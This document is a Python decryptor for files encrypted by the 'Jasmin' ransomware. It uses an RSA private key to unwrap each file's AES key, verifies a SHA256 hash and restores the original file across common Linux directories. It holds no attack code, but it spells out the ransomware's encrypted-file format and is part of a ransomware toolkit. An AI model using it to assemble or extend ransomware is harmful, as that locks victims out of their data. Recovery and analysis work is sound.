#!/usr/bin/env python3
"""
Jasmin Linux Decryptor — RSA私钥解密AES密钥，SHA256完整性校验
用法: python3 jasmin_decrypt.py <private_key.pem> [目录...]
"""
import os, sys, struct, hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

def unpad(data: bytes) -> bytes:
    if len(data) == 0:
        raise ValueError('empty')
    n = data[-1]
    if n < 1 or n > 16:
        raise ValueError('bad padding')
    if data[-n:] != bytes([n] * n):
        raise ValueError('bad padding')
    return data[:-n]

def decrypt_file(path: str, rsa_priv) -> str:
    raw = open(path, 'rb').read()
    # 最小: 32(sha)+16(aes block)+256(rsa)+4(len)=308
    if len(raw) < 308:
        return None

    ek_len = struct.unpack('<I', raw[-4:])[0]
    if ek_len <= 0 or ek_len > 512:
        return None
    ek_start = len(raw) - 4 - ek_len
    if ek_start <= 32:
        return None

    orig_hash = raw[:32]
    ek = raw[ek_start:ek_start + ek_len]
    ct = raw[32:ek_start]

    try:
        km = rsa_priv.decrypt(ek, asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(), label=None))
    except Exception:
        return None
    if len(km) != 48:
        return None

    aes_key = km[:32]
    aes_iv = km[32:]

    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(aes_iv), default_backend())
    dec = cipher.decryptor()
    padded = dec.update(ct) + dec.finalize()
    plain = unpad(padded)

    # SHA256完整性校验
    check = hashlib.sha256(plain).digest()
    if check != orig_hash:
        print(f'[!] INTEGRITY FAIL: {path}')
        return None

    out = path[:-7] if path.endswith('.jasmin') else path + '.dec'
    with open(out, 'wb') as f:
        f.write(plain)
    os.remove(path)
    return out

def main():
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <private_key.pem> [dir1 dir2 ...]')
        sys.exit(1)

    pem_path = sys.argv[1]
    with open(pem_path, 'rb') as f:
        priv_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())

    dirs = sys.argv[2:] if len(sys.argv) > 2 else ['/home', '/root', '/var', '/opt', '/tmp', '/srv']

    ok = 0
    fail = 0
    for d in dirs:
        if not os.path.isdir(d):
            continue
        for dirpath, _, files in os.walk(d):
            for fname in files:
                if not fname.endswith('.jasmin'):
                    continue
                fp = os.path.join(dirpath, fname)
                try:
                    r = decrypt_file(fp, priv_key)
                    if r:
                        ok += 1
                        print(f'[+] {r}')
                    else:
                        fail += 1
                        print(f'[-] Failed: {fp}')
                except Exception as e:
                    fail += 1
                    print(f'[-] Error {fp}: {e}')

    print(f'\n=== Done: {ok} decrypted, {fail} failed ===')

if __name__ == '__main__':
    main()
